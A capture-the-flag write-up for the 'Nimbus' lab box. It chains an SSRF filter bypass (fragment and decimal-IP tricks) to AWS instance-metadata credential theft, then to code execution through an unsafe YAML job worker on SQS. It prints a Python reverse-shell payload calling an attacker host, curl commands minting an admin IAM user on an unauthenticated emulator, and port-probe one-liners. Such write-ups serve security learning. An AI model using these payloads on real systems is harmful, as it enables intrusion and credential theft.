# Nimbus

## Engagement Notes

Nimbus is a Linux box built around a fictional internal job-scheduling service
sitting in front of a real, open-source AWS emulator
([floci](https://github.com/floci-io/floci)). The whole chain runs through an
SSRF in the scheduler's "preview a job by URL" feature: a URL-fragment trick
and decimal-IP encoding both slip past its "must be `.yaml`, internal
addresses blocked" filter, which is enough to reach AWS's instance-metadata
service and steal a temporary IAM role's credentials. Those credentials reach
an SQS queue whose consumer — a "job worker" — deserializes message bodies
with an unsafe YAML loader and runs whatever `script` field it finds through
`python3 -c`, worth full code execution as soon as a message can be sent.

**This writeup is presented as far as the engagement notebook currently
runs.** There is no `root.txt` and no shell beyond the SQS worker's own
container. The notebook ends mid-exploration of a second, internal-only
AWS-shaped service that rejects every credential tried against it and isn't
even network-reachable except through the app's own SSRF — an open thread,
not a solved one. It's kept in rather than trimmed to a clean ending, because
the open thread and the reflection on what was missed are as instructive as
the parts that worked.

## Attack path

1. **Recon** → `nimbus.htb` has 22 (ssh) and 80 (http) open; `/login` and
   `/jobs` are discoverable, and `aws.nimbus.htb` exists as a vhost (403
   direct).
2. **`/jobs`** → an "Internal Job Scheduler" that previews a job by fetching
   a remote URL server-side, with its own hint text naming the two filters it
   tries to enforce: `.yaml`-only URLs, and an internal/metadata blocklist.
3. **SSRF confirmed** → appending a URL fragment (`#/obf.yaml`) satisfies the
   `.yaml` check without changing where the actual HTTP client ends up
   fetching from.
4. **Internal port scan through the SSRF** → blind-scanning `0:1-9999`
   through the preview form finds two open internal ports: `5000` (the
   scheduler's own backend API) and `9090` (unresolved — see below).
5. **AWS IMDS via decimal-IP encoding** → `169.254.169.254` converted to its
   decimal form gets past the same filter, walking the full instance-metadata
   tree to a role, `nimbus-web-role`, and its temporary credentials.
6. **Cloud pivot** → those credentials reach an SQS queue and, via the SSRF
   directly, an S3 bucket holding the job-worker's own source — which reveals
   an unsafe YAML deserialize-then-execute path.
7. **RCE via SQS message** → a crafted message with a `script` field runs as
   Python inside the worker's container, caught as a reverse shell.
   `user.txt` recovered.
8. **Static credentials leak** → the worker container's own environment
   holds a second, non-temporary AWS key pair.
9. **Unauthenticated root on the emulated cloud** → the AWS emulator behind
   the queue (`floci`) answers `GetCallerIdentity` — and everything else —
   with the account's root identity, with **zero credentials sent**. A new
   admin IAM user and an EC2 key pair are minted through that access.
10. **EC2 / user-data attempts** → multiple `run-instances` calls with an
    exfiltrating user-data script produce no confirmed callback — a
    dead end (see below).
11. **Open thread** → a second, internal-only AWS-shaped service on `:9090`
    is reachable only through the app's own SSRF (not from the worker
    container's network at all) and rejects every credential set tried
    against it. Notebook ends here.

## Foothold — SSRF → AWS IMDS → SQS worker RCE

The URL field is a server-side fetcher. Submitting a URL ending in
`#/obf.yaml` and pointing the host:port before the `#` at an attacker-
controlled listener confirms it live:

```console
$ nc -l 8081
GET /test.yml HTTP/1.1
Host: 10.10.14.85:8081
User-Agent: python-requests/2.34.2
```

> 🧠 The fragment trick is a stock WAF-bypass move, reached for on sight of
> the `.yaml`-only hint text: an HTTP client never sends a URL's fragment to
> the server, so a string check on the raw submitted URL sees `...#/obf.yaml`
> and is satisfied, while the actual request goes wherever the host:port
> before the `#` points.

With the fetcher confirmed, a helper wraps it:

```python
def ssrf(url, session=None):
    payload = url+"#/obf.yaml"
    s = requests.Session()
    r = s.post("http://nimbus.htb/jobs/preview", data={"url": payload})
    soup = BeautifulSoup(r.text, 'html.parser')
    response = soup.find('pre')
    return response
```

A blind scan of `http://0:{port}` for every port 1-9999 (`0` being a form of
`0.0.0.0` already past the "internal addresses...blocked" filter) turns up
exactly two open internal ports:

```
Port 5000 is open
...
Port 9090 is open
```

> 🧠 The scan was simply "enumerate services behind the SSRF" — no narrower
> guess was made about what would be back there before running it; the
> request is free and automatable, so a full sweep was the default rather
> than a targeted guess.

Port 5000 is the scheduler's own backend, and its health endpoint names an
internal AWS-style API:

```json
{
    "services": {
        "queue": {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
        "scheduler": {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
        "storage": {"endpoint": "http://aws.nimbus.htb", "status": "ok"}
    },
    "status": "healthy",
    "version": "1.4.2"
}
```

`169.254.169.254` (AWS's instance-metadata address) is presumably on the same
blocklist as `169.254...`/`metadata`-shaped strings, so it's converted to its
decimal form (`2852039166`) before being handed to the same `ssrf()` helper:

```console
$ python3 -c "print(int(''.join(bin(int(x))[2:].zfill(8) for x in '169.254.169.254'.split('.')), 2))"
2852039166
```

That reaches the full IMDS tree — role name, then temporary credentials:

```
iam/security-credentials/ -> nimbus-web-role
{'AccessKeyId': 'ASIAQX4P…N5R8',
 'SecretAccessKey': 'bXJ7K8mP…KjQs',
 'Token': 'IQoJb3Jp…xKfM',
 'Type': 'AWS-HMAC'}
```

> 🧠 Decimal-IP encoding wasn't discovered against this filter specifically —
> it's a known SSRF-blocklist-bypass technique already familiar from other
> challenges, reached for directly rather than after a failed literal-IP
> attempt.

`boto3` against `endpoint_url="http://aws.nimbus.htb"` with those credentials
confirms the identity and finds the job queue:

```
sts.get_caller_identity()
{'Arn': 'arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a', ...}

sqs.list_queues()["QueueUrls"][0]
http://floci:4566/847219365028/nimbus-jobs
```

The SSRF also reaches the S3 API directly (`http://0:14566`, no credentials
needed through the preview fetcher), turning up a bucket with the job
worker's own source:

```python
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

def handle_message(body):
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    if not isinstance(job, dict):
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    if script:
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
```

The worker's own docstring already flags the bug — an unsafe
[`yaml.Loader`](https://cwe.mitre.org/data/definitions/502.html) (CWE-502,
Deserialization of Untrusted Data) instead of `safe_load`, feeding directly
into `subprocess.run(["python3", "-c", ...])` on any message with a `script`
key. `nimbus-web-role`'s temporary credentials are already enough to
`sqs.send_message`, so a crafted YAML payload becomes code execution:

```console
$ sqs.send_message(QueueUrl=queueUrl, MessageBody="""script: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.85",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
name: reverse_shell""")
```

## Post-exploitation — the emulated cloud backend has no authentication

The worker container has no `sshd` at all — an SSH key dropped into
`~/.ssh/authorized_keys` goes nowhere:

> This is on a damn container, ssh isn't running on it so I can't ssh in here

`env` inside the container leaks a second, static (non-STS) AWS key pair
baked into the deployment:

```
AWS_ACCESS_KEY_ID=AKIA7P3R…5VHN
AWS_SECRET_ACCESS_KEY=dM4nV/q8…JfWh
AWS_ENDPOINT_URL=http://aws.nimbus.htb
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
```

Three separate tools were run against that static key —
[`enumerate-iam.py`](https://github.com/andresriancho/enumerate-iam), Pacu,
and [`aws-enumerator`](https://github.com/shabarkin/aws-enumerator) — all
landing on the same conclusion: only `sts:GetCallerIdentity` and
`sqs:ListQueues` are allowed for `nimbus-worker-role/worker`.

> 🧠 No single one of the three was distrusted — running all three was
> closer to "trying different tools to see how they work" than
> cross-verification against a specific doubt.

The operator's own contemporaneous network model, built from the container's
`/etc/hosts` and a couple of `ping`/`hostname` checks:

> 172.18.0.1/10.129.22.217 = nimbus probably (host?)
> 22: ssh · 80: nginx, writes to nimbus-job queue · aws -> floci:4566 ·
> 14566 -> floci:4566
>
> 172.18.0.2 = floci · 9169: imds · 4566: aws api, root account access
>
> 172.18.0.3 = worker · no ports open, reads from nimbus-job queue

The queue hostname (`floci`) and its port (`4566`) are what sent the
investigation to [floci's own GitHub repo](https://github.com/floci-io/floci):

![floci architecture diagram showing an AWS-wire-protocol HTTP router in front of stateful services, container services (including EC2, ECS, Lambda), and a storage backend](/assets/images/ctf/events/season11-htb-26/nimbus/floci-architecture-diagram.png)

> 🧠 It was the combination of the queue's hostname and the classic
> LocalStack-style `4566` port that pointed at the project directly, not one
> or the other alone.

From inside the worker container, an **unauthenticated** request against
`floci:4566` was tried "just as a try-it-and-see" — no expectation set going
in:

```console
$ curl -XPOST http://floci:4566/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'Action=GetCallerIdentity'
<GetCallerIdentityResponse ...><UserId>847219365028</UserId>...
```

```console
$ aws --no-cli-pager --endpoint-url http://floci:4566 sts get-caller-identity
{
    "UserId": "847219365028",
    "Account": "847219365028",
    "Arn": "arn:aws:iam::847219365028:root"
}
```

Zero credentials, and the account's own root ARN comes back. Floci's own
documentation confirms this isn't a misconfiguration specific to the box —
it's the project's default posture: *"No account. No auth token. No feature
gates. Just `docker compose up`."* and *"Credentials can be any non-empty
values unless you explicitly enable stricter service-specific auth
checks."* — [floci-io/floci README](https://github.com/floci-io/floci). A
health check against the emulator elsewhere in the notebook confirms the
`community`/`floci-always-free` edition is what's running here, which is the
edition without the stricter checks enabled.

> 🧠 This is the actual pivot of the box: a low-privilege web-app SSRF turns
> into full-privilege access to the account's entire emulated cloud control
> plane, because the backend behind the queue trusts *any* request, signed
> or not.

That unauthenticated root access is used to mint a persistent, tool-friendly
identity — a new admin IAM user, rather than continuing to rely on the
unauthenticated path for everything:

```console
$ curl -XPOST http://floci:4566/ -d 'Action=CreateUser&UserName=root2'
$ curl -XPOST http://floci:4566/ -d 'Action=AttachUserPolicy&UserName=root2&PolicyArn=arn:aws:iam::aws:policy/AdministratorAccess'
$ curl -XPOST http://floci:4566/ -d 'Action=CreateAccessKey&UserName=root2'
$ aws --no-cli-pager --endpoint-url http://floci:4566 ec2 import-key-pair --key-name root2 --public-key-material `echo 'ssh-ed25519 AAAA...' | base64 -w 0`
```

> 🧠 Minting `root2` was about fighting namespace reuse (a fresh, known
> identity for later automation and CLI use), not about needing a specific
> action the fully-unauthenticated path couldn't already do — most of the
> subsequent `aws_cli()` enumeration in the notebook keeps hitting
> `floci:4566` completely unauthenticated anyway.

Broad enumeration follows: `rds describe-db-instances` (empty), `ec2
describe-key-pairs`, a very large `ce get-cost-and-usage` dump (elided —
huge JSON invoice blob), and `ec2 describe-images`, which turns up a real
AMI distinct from the IMDS `ami-id` field:

```console
$ aws --no-cli-pager --endpoint-url http://floci:4566 ec2 describe-images --query 'Images[].[ImageId,Name,State,Architecture]' --output text
ami-0abcdef1234567890  amzn2-ami-hvm-2.0.20230404.0-x86_64-gp2  available  x86_64
```

## What didn't work

- **SSH into the worker container.** No `sshd` runs there at all — the
  container only executes whatever the queue hands it.
- **`ec2 run-instances` with an exfiltrating user-data script.** Multiple
  attempts, against two different AMI IDs, used the minted `root2` key pair
  and a base64 user-data payload designed to curl recon output back to a
  listener. No callback was ever caught. Per the operator: *"some of these
  functions weren't set up to work; it was only a couple specific flows that
  were set up in this emulated environment to spawn a container with root
  privileges."* Floci's own docs describe EC2 `RunInstances` as backed by
  real Docker containers with UserData support in general — but this
  particular deployment evidently didn't have that specific flow wired up.
- **`file://` URLs against the SSRF**, trying to read the app's own source
  (`/etc/passwd`, `/app/app.py`, `/proc/self/environ`) directly rather than
  through a network fetch — blocked outright: `Only http:// and https://
  URLs are supported.`

## Open thread — the second internal service on `:9090`

The blind SSRF port scan also found `:9090` open, but it's a genuinely
separate service from `floci`. It answers AWS-shaped errors
(`InvalidClientTokenId`) to **every** credential set tried against it — the
temporary `nimbus-web-role` role, the static worker key, and the minted
`root2` admin key all fail the same way. It also isn't reachable from the
worker container's own network at all:

```console
$ for h in 172.18.0.1 172.18.0.2 172.18.0.3 floci nimbus aws.nimbus.htb 127.0.0.1; do timeout 2 bash -c "echo >/dev/tcp/$h/9090" 2>/dev/null && echo "$h:9090 OPEN" || echo "$h:9090 closed"; done
172.18.0.1:9090 closed
172.18.0.2:9090 closed
172.18.0.3:9090 closed
floci:9090 closed
nimbus:9090 closed
aws.nimbus.htb:9090 closed
127.0.0.1:9090 closed
```

— it's only reachable through the app's own SSRF fetcher. Fuzzing the SSRF
filter itself found that URL-encoded slashes in the query string are
blocked, but a literal `/` or a plain query string both pass through
unfiltered:

```
plain       THROUGH
enc_UPPER   BLOCKED
literal     THROUGH
double_enc  BLOCKED
```

Bypassing that filter got requests through to `:9090`, but every credential
tried still comes back `InvalidClientTokenId` — a separate account/keyspace
from `floci`, with no known credentials for it captured in the notebook. The
working theory going in was a second AWS-emulator instance entirely separate
from `floci`, which the operator now believes wasn't actually the case — the
notebook ends here, unresolved.

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified
against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | SSRF in the job scheduler's URL-preview feature, reaching internal-only ports and services |
| Unsecured Credentials: Cloud Instance Metadata API | [T1552.005](https://attack.mitre.org/techniques/T1552/005/) | `nimbus-web-role` temporary credentials read from AWS IMDS via the SSRF |
| Unsecured Credentials | [T1552](https://attack.mitre.org/techniques/T1552/) | Static `worker_role` AWS key pair found in the worker container's environment variables — no sub-technique covers environment variables specifically, but a Pacu-sourced procedure example under this parent technique cites credentials found in build-environment variables, matching this case closely |
| Command and Scripting Interpreter: Python | [T1059.006](https://attack.mitre.org/techniques/T1059/006/) | The SQS-worker RCE: `subprocess.run(["python3", "-c", script])` on an attacker-controlled message body |
| Create Account: Cloud Account | [T1136.003](https://attack.mitre.org/techniques/T1136/003/) | `CreateUser` + `AttachUserPolicy` (`AdministratorAccess`) minting `root2` on the unauthenticated `floci:4566` endpoint |
| Cloud Service Discovery | [T1526](https://attack.mitre.org/techniques/T1526/) | The broad `aws_cli()` sweep against `floci:4566` (`rds`, `ec2`, `ce`, `s3api`, …) once access was in hand |

> **Not tagged, and why:** **T1078.004 Valid Accounts: Cloud Accounts** was
> considered for authenticating with the leaked/minted AWS keys, but MITRE's
> own examples for that technique center on compromised user/service
> *accounts* (Azure AD, O365) rather than static API key pairs, and its
> definition doesn't explicitly cover this case — using it here would be a
> stretch beyond what the page actually documents. The unsafe
> `yaml.Loader` deserialization in the job worker is
> [CWE-502](https://cwe.mitre.org/data/definitions/502.html) (Deserialization
> of Untrusted Data) but has no matching ATT&CK technique of its own — the
> *execution* it enables is what's tagged, under T1059.006. Floci answering
> every API call with no authentication at all also has no dedicated ATT&CK
> ID; it's a specific application-design choice (confirmed against floci's
> own docs above), not a catalogued adversary technique.

## Lessons

- **Try every path to a shell before committing to one.** In the operator's
  own words: *"Eventually I found some documentation on making shells with
  other tools in the floci toolkit. Had I actually attempted every way to
  make a shell rather than just trying to spin up an EC2 instance only, I
  would have stumbled on it. Lesson is to try everything twice."* Floci's own
  docs describe several container-backed services beyond EC2 — Lambda's
  "warm container pool," ECS task execution, and CodeBuild's "real buildspec
  execution" — any of which might have gotten further than the single
  `run-instances` + user-data path that was actually tried.
- **A queue hostname and a familiar port number are worth chasing directly.**
  Recognizing `floci:4566` as *the* floci project (rather than a generic
  internal hostname) and reading its own docs is what surfaced the
  no-auth-by-default posture — that fact was never going to be discovered by
  fuzzing the API further.
- **An SSRF filter's blind spots are worth mapping precisely.** The `:9090`
  filter-fuzzing (which encodings pass, which don't) is a repeatable
  technique independent of whether it paid off *this time* — it did get
  requests through to an otherwise-unreachable service, even though valid
  credentials for that service were never found.
